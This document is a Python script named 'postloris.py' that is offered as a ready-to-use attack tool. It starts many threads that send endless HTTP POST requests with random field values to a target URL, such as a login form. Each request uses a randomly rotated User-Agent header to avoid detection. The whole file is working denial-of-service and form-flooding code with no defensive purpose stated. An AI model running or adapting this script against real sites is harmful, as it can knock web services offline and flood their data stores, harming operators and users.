#!/usr/bin/python3

# Programmed by hXR16F
# hXR16F.ar@gmail.com, https://github.com/hXR16F

import sys
import requests
import random
import string
from multiprocessing.pool import ThreadPool as Pool

def randomString(stringLength):
    letters = string.ascii_lowercase + string.digits + string.ascii_uppercase
    return ''.join(random.choice(letters) for i in range(stringLength))

def worker(x):
	global i
	i = 1
	while i > 0:
		print("Sending payload...")
		if len(sys.argv)==8:
			values = {fields[0]: randomString(stringLength), fields[1]: randomString(stringLength), fields[2]: randomString(stringLength), fields[3]: randomString(stringLength), fields[4]: randomString(stringLength)}
		if len(sys.argv)==7:
			values = {fields[0]: randomString(stringLength), fields[1]: randomString(stringLength), fields[2]: randomString(stringLength), fields[3]: randomString(stringLength)}
		if len(sys.argv)==6:
			values = {fields[0]: randomString(stringLength), fields[1]: randomString(stringLength), fields[2]: randomString(stringLength)}
		if len(sys.argv)==5:
			values = {fields[0]: randomString(stringLength), fields[1]: randomString(stringLength)}
		if len(sys.argv)==4:
			values = {fields[0]: randomString(stringLength),}
		
		user_agent = random.choice(user_agent_list)
		headers = {'User-Agent': user_agent}
		r = requests.post(url, data=values, headers={'User-Agent': user_agent})
		print("	Payload sent! =>", i, "\n")
		i += 1
		
if len(sys.argv)==1:
	print("                 _   _            _")
	print("                | | | |          (_)")
	print(" _ __   ___  ___| |_| | ___  _ __ _ ___")
	print("| '_ \\ / _ \\/ __| __| |/ _ \\| '__| / __|")
	print("| |_) | (_) \\__ \\ |_| | (_) | |  | \\__ \\")
	print("| .__/ \\___/|___/\\__|_|\\___/|_|  |_|___/")
	print("| |")
	print("|_|\n")
	print('Usage: postloris.py <url> <threads> [fields]\n')
	print('Examples: python3 postloris.py http://localhost/login.php 25 email password')
	print('          python3 postloris.py http://localhost/login.php 16 login pass key')
	print('          python3 postloris.py http://localhost/login.php 4 username\n')
	sys.exit(1)
	
url = sys.argv[1]
try:
    r = requests.get(url)
    r.raise_for_status()
except:
	print('Cannot check URL!')
	
if len(sys.argv)==8:
	fields = [sys.argv[3], sys.argv[4], sys.argv[5], sys.argv[6], sys.argv[7]]
	
if len(sys.argv)==7:
	fields = [sys.argv[3], sys.argv[4], sys.argv[5], sys.argv[6]]
	
if len(sys.argv)==6:
	fields = [sys.argv[3], sys.argv[4], sys.argv[5]]
	
if len(sys.argv)==5:
	fields = [sys.argv[3], sys.argv[4]]
	
if len(sys.argv)==4:
	fields = [sys.argv[3]]
	
pool_size = int(sys.argv[2])
stringLength = 16 # Max field length

user_agent_list = [
	'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36',
	'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36',
	'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36',
	'Mozilla/5.0 (Linux; Android 9; SM-G960F Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.3729.157 Mobile Safari/537.36',
	'Mozilla/5.0 (Linux; Android 7.0; SM-G610M Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36',
	'Mozilla/5.0 (Linux; Android 6.0.1; CPH1607 Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/63.0.3239.111 Mobile Safari/537.36',
	'Mozilla/5.0 (Linux; U; Android 6.0.1; zh-CN; F5121 Build/34.0.A.1.247) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.5.1.944 Mobile Safari/537.36',
	'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36',
	'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36 Edge/15.15063',
	'Mozilla/5.0 (iPhone; CPU iPhone OS 12_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148',
	'Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 Mobile/15E148 Safari/604.1',
	'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1.2 Safari/605.1.15',
	'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36',
	'Mozilla/5.0 (Linux; U; Android 6.0.1; zh-CN; F5121 Build/34.0.A.1.247) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.5.1.944 Mobile Safari/537.36',
	'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36',
	'Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-J320M Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/6.4 Chrome/56.0.2924.87 Mobile Safari/537.36',
	'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36 OPR/56.0.3051.52',
	'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36 OPR/42.0.2393.94',
	'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0',
	'Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19',
	'Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.111 Mobile Safari/537.36',
	'Mozilla/5.0 (Linux; Android 5.1; HUAWEI CUN-L22 Build/HUAWEICUN-L22; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/62.0.3202.84 Mobile Safari/537.36',
	'Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 YaBrowser/18.3.1.1232 Yowser/2.5 Safari/537.36',
	'Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19',
	'Mozilla/5.0 (Linux; Android 6.0; MotoG3 Build/MPIS24.65-33.1-2-16) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.158 Mobile Safari/537.36',
	'Mozilla/5.0 (Linux; Android 6.0; Lenovo A7020a48 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.137 Mobile Safari/537.36',
	'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3198.0 Safari/537.36 OPR/49.0.2711.0'
]

pool = Pool(pool_size)
for x in range(pool_size):
	pool.apply_async(worker, (x,))
	
pool.close()
pool.join()